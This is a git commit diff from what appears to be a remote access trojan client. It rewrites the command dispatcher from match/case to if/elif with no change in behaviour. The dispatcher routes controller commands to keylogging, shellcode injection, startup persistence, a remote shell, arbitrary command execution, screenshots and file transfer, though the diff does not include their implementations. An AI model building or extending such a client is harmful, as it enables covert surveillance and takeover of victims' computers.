8f8a1490a461d8d79e1d5709ee12a9d7677c6324
Alperen Aga <alperencode@gmail.com>
2022-04-22 16:53:44 +0300

    Closes #84

--- src/client/command_handler.py
+++ src/client/command_handler.py
@@ -17,36 +17,35 @@ class CommandHandler:
 
         _command = command["key"]
 
-        match _command:
-            case c.CLIENT_EXIT:
-                self.control.close()
-            case c.CLIENT_ADD_STARTUP:
-                self.control.add_startup()
-            case c.CLIENT_RMV_STARTUP:
-                self.control.add_startup(True)
-            case c.CLIENT_SCREENSHOT:
-                self.control.screenshot()
-            case c.CLIENT_UPLOAD_FILE:
-                self.control.upload(command["value"]["buffer"], command["value"]["value"])
-            case c.CLIENT_RECV_FILE:
-                self.control.receive(command["value"])
-            case c.CLIENT_LOCK:
-                self.control.lock()
-            case c.CLIENT_HEARTBEAT:
-                pass
-            case c.CLIENT_SHELL:
-                self.control.command_shell()
-            case c.CLIENT_PYTHON_INTERPRETER:
-                self.control.python_interpreter()
-            case c.CLIENT_KEYLOG_START:
-                self.control.keylogger_start()
-            case c.CLIENT_KEYLOG_STOP:
-                self.control.keylogger_stop()
-            case c.CLIENT_KEYLOG_DUMP:
-                self.control.keylogger_dump()
-            case c.CLIENT_RUN_CMD:
-                self.control.run_command(command["value"])
-            case c.CLIENT_DISABLE_PROCESS:
-                self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
-            case c.CLIENT_SHELLCODE:
-                self.control.inject_shellcode(command["value"]["buffer"])
+        if _command == c.CLIENT_EXIT:
+            self.control.close()
+        elif _command == c.CLIENT_ADD_STARTUP:
+            self.control.add_startup()
+        elif _command == c.CLIENT_RMV_STARTUP:
+            self.control.add_startup(True)
+        elif _command == c.CLIENT_SCREENSHOT:
+            self.control.screenshot()
+        elif _command == c.CLIENT_UPLOAD_FILE:
+            self.control.upload(command["value"]["buffer"], command["value"]["value"])
+        elif _command == c.CLIENT_RECV_FILE:
+            self.control.receive(command["value"])
+        elif _command == c.CLIENT_LOCK:
+            self.control.lock()
+        elif _command == c.CLIENT_HEARTBEAT:
+            pass
+        elif _command == c.CLIENT_SHELL:
+            self.control.command_shell()
+        elif _command == c.CLIENT_PYTHON_INTERPRETER:
+            self.control.python_interpreter()
+        elif _command == c.CLIENT_KEYLOG_START:
+            self.control.keylogger_start()
+        elif _command == c.CLIENT_KEYLOG_STOP:
+            self.control.keylogger_stop()
+        elif _command == c.CLIENT_KEYLOG_DUMP:
+            self.control.keylogger_dump()
+        elif _command == c.CLIENT_RUN_CMD:
+            self.control.run_command(command["value"])
+        elif _command == c.CLIENT_DISABLE_PROCESS:
+            self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
+        elif _command == c.CLIENT_SHELLCODE:
+            self.control.inject_shellcode(command["value"]["buffer"])
